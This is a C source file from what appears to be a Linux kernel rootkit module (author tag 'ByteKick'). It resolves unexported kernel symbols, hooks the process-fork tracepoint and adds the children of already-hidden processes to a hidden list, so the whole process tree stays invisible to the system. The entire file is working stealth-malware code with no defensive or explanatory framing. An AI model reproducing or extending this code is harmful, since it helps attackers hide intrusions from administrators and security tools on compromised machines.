#include "../include/core.h"
#include "../include/trace.h"
#include "../include/hidden_pids.h"
#include "../ftrace/ftrace_helper.h"

static struct tracepoint *tp_sched_fork;
static int (*_probe_register)(struct tracepoint *, void *, void *);
static int (*_probe_unregister)(struct tracepoint *, void *, void *);

notrace static void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
{
    if (is_hidden_pid(parent->pid) || is_hidden_pid(parent->tgid) ||
        is_child_pid(parent->pid) || is_child_pid(parent->tgid)) {
        add_child_pid(child->pid);
        add_child_pid(child->tgid);
    }
}

notrace int trace_pid_init(void)
{
    _probe_register = (void *)resolve_sym("tracepoint_probe_register");
    _probe_unregister = (void *)resolve_sym("tracepoint_probe_unregister");
    tp_sched_fork = (void *)resolve_sym("__tracepoint_sched_process_fork");

    if (tp_sched_fork && _probe_register)
        _probe_register(tp_sched_fork, on_fork_handler, NULL);

    return 0;
}
EXPORT_SYMBOL(trace_pid_init);

notrace void trace_pid_cleanup(void)
{
    if (tp_sched_fork && _probe_unregister)
        _probe_unregister(tp_sched_fork, on_fork_handler, NULL);
}
EXPORT_SYMBOL(trace_pid_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ByteKick");
